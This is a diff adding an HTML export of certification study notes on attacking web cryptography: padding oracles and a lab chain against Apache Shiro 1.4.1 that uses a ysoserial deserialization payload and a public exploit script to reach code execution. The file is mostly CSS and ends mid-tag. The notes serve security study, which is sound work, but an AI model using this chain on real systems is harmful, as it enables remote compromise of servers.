@@ -1,0 +1,766 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Attacking Crypto</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="14e231bf-f1e2-4b1c-8dab-606720ffee52" class="page mono"><header><h1 class="page-title"><strong>Attacking Crypto</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h1 id="2f175bac-321c-47bc-868c-9e31e93e597f" class=""><strong>Attacking Crypto</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#attacking-crypto"></a></strong></h1><ul id="fcfa7c3d-d8dc-4358-96a8-553acb8a7939" class="bulleted-list"><li style="list-style-type:disc">Padding Oracle Attack</li></ul><ul id="5bf9e26e-026b-40cc-b10b-ae55f4360ebf" class="bulleted-list"><li style="list-style-type:disc">Hash Length Extension Attack</li></ul><ul id="ca5e22d6-1455-481e-8201-2f16cdc09a28" class="bulleted-list"><li style="list-style-type:disc">Leveraging machineKey</li></ul><ul id="e33c7bdc-b0c2-402f-9ef2-20ad1e201d67" class="bulleted-list"><li style="list-style-type:disc">Subverting HMAC in Node.js</li></ul><h2 id="45262958-6d05-4d4e-9626-6ed8eda56eb5" class=""><strong>What is a Padding Oracle</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#what-is-a-padding-oracle"></a></strong></h2><p id="f28645fe-55e5-4d9e-b24d-d6d758e4ace2" class="">In web app an Oracle is any application functionality, error message or behavior that can reveal valuable information</p><ul id="e5f32c33-552d-4659-b6d7-0a83c46c5aef" class="bulleted-list"><li style="list-style-type:disc">https://robertheaton.com/2013/07/29/padding-oracle-attack/</li></ul><ul id="11673b83-f3e6-4e01-86df-4b03e13d4b50" class="bulleted-list"><li style="list-style-type:disc">This attack leverages proper and improper padding as a means of gaining application information</li></ul><p id="8abcdaba-66e5-4a27-9165-a4a2f7a205b6" class="">CBC-mode decryption funcions operating with PLCS7-mode padding</p><ul id="c0ab1ae9-8309-4996-bad8-0be0d90dc5e9" class="bulleted-list"><li style="list-style-type:disc">http://seffyvon.github.io/cryptography/2014/08/20/CBC-Padding-Oracle-Attacks/</li></ul><ul id="d4e98b40-0912-46f5-8c8a-1039f03d8ca0" class="bulleted-list"><li style="list-style-type:disc">A padding oracle can reveal if the padding is correct For a given ciphertext.</li></ul><p id="3755c811-f50c-4bbc-8b08-297fc4657909" class="">Another resource:</p><ul id="c20aea04-7646-4b9b-afc3-5928dcbe92c9" class="bulleted-list"><li style="list-style-type:disc">http://netifera.com/research/poet/PaddingOracleBHEU10.pdf</li></ul><h3 id="e34baad7-730c-4140-ac59-78463fe91d32" class=""><strong>Intermediate Values</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#intermediate-values"></a></strong></h3><p id="9e2e1c05-74ae-4049-9a72-0f385acefae6" class="">Are the output of the block cipher during the block cipher process</p><p id="c5b2a61b-d626-4f0a-b5d1-a78f4807de6e" class="">Essentially, they can be seen as the state of a ciphertext block after decryption and before the XOR operation with the previous ciphertext block</p><p id="ca4bb401-0fc6-4262-be32-aa3e54217f42" class="">Once intermediate bytes are found, deciphering the plaintext of the corresponding ciphertext is easy</p><h2 id="6c95df78-6cd5-4aa3-b173-3df97377d503" class=""><strong>Padding Oracle Attack Scenario</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#padding-oracle-attack-scenario"></a></strong></h2><p id="977ffca0-db1d-42e0-9727-69d11c5296d0" class="">Scenario of attack against Apache Shiro</p><p id="bbf0faee-9f75-4f2a-94ae-90f67b00f99c" class="">Apache Shiro is a Java Security framework that has functions to perform authentication, authorization, password, and session management.</p><ul id="94954a90-26dc-48c4-bf39-42fabb3d77cb" class="bulleted-list"><li style="list-style-type:disc">older shiro versions suffered from a Padding Oracle Vulnerability, that when chained with a another deserialization-based vulnerability could result in RCE</li></ul><ul id="30295a31-9aa6-4fc2-b3a2-572fd177a27b" class="bulleted-list"><li style="list-style-type:disc">Shiro used the AES-128-CBC mode to encrypt cookies enabling Padding Oracle attacks.</li></ul><p id="dc5f312e-f91d-4583-aeba-b22dec2a3596" class="">Moreover:</p><ul id="6003e8af-37e5-47a8-9305-b0fffa6d57a8" class="bulleted-list"><li style="list-style-type:disc">https://www.anquanke.com/post/id/192819</li></ul><h3 id="649f39f1-ee15-45ad-8bdd-7a439cca15fb" class=""><strong>Creating vulnerable environment</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#creating-vulnerable-environment"></a></strong></h3><p id="ba0d0011-2f6b-4f6b-9f9b-16dcef0d81ac" class="">We have set up our own vuln environment using Apache Shiro 1.4.1 + tomcat:8-jre8</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5fccc168-1649-48be-82bd-121ccfb404b5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">git clone https://github.com/apache/shiro.git
+cd shiro
+git checkout shiro-root-1.4.1
+mvn install
+cd samples/web
+mvn install
+</code></pre><p id="3d5831b3-0e95-4da9-86b2-b825832e8df1" class="">Copy the samples-web-1.4.1.war package (samples/target) obtained after compilation to the Tomcat webapps directory</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6c4056b0-e960-44c0-9edf-25397b07889e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">start tomcat
+</code></pre><h3 id="aaf03b08-0d90-4a44-8edd-dcddefde37d7" class=""><strong>The attack</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#the-attack"></a></strong></h3><p id="fb786e03-09d1-453f-8b9c-68631d0c4634" class="">1 - Grab cookie with BURP</p><p id="7b7ad037-cc1f-49ff-8cce-f5de444621d6" class="">2 - Create a serialized payload with YsoSerial:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="01d07505-dd8f-41a9-a151-2d8cef1c3bc8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 &quot;touch /tmp/Success&quot; &gt; payload.class
+</code></pre><p id="8ee19e51-f9c4-4f03-8565-e5f2c4210ffb" class="">3 - Download the publicly available exploit:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="07a66e42-c7ef-4c0a-8be9-7cd0e204e712" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
+# use to captures the &#x27;remember me&#x27; cookie as a prefix For the Padding Oracle attack
+</code></pre><p id="2f73754d-43ec-4bf3-a5dd-f710e4921417" class="">4 - After a couple hours the exploit script provided us with a valid cookie containing our payload. This cookie will be deserialized by the vuln server</p><p id="6eb9845d-ad98-4cfb-8cda-d6dfd2d52626" class="">5 - Use BURP Repeater to issued a request with out crafted cookie.</p><blockquote id="af6bc239-5b48-44db-a5e6-b6d0917c2a17" class="">The Padding Oracle Attacks are Chosen-Ciphertext Attacks (CCA)</blockquote><h2 id="3046c849-195b-47f3-82c1-4908a459e423" class=""><strong>Fundamentals</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#fundamentals"></a></strong></h2><p id="0c082b95-e9fa-4a45-a5bc-6d6db0e16434" class="">There are web apps that prepend a secret value to data, hash this value with a flawed algorithm and provides the user with both data and the hash, but not the secret</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e84052fa-e573-4190-b428-e29a5ac2b3c6" class="code"><code class="language-Plain Text" 